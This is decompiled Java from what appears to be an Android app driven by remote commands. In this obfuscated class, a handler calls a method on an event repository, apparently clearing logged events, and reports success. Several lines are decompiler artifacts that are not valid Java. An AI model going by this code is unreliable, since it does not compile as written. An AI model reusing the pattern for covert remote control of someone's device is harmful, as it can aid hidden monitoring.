package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.eventrepository.c;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class e
{
  private static final boolean a = a.a;
  private RmtCtrlOutputStatusMessage b;
  
  public e()
  {
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    localRmtCtrlOutputStatusMessage.<init>();
    this.b = localRmtCtrlOutputStatusMessage;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = paramh.j;
      ((c)localObject1).c();
      localObject1 = this.b;
      boolean bool2 = true;
      ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(bool2);
      bool1 = a;
      if (bool1) {}
      localObject1 = this.b;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */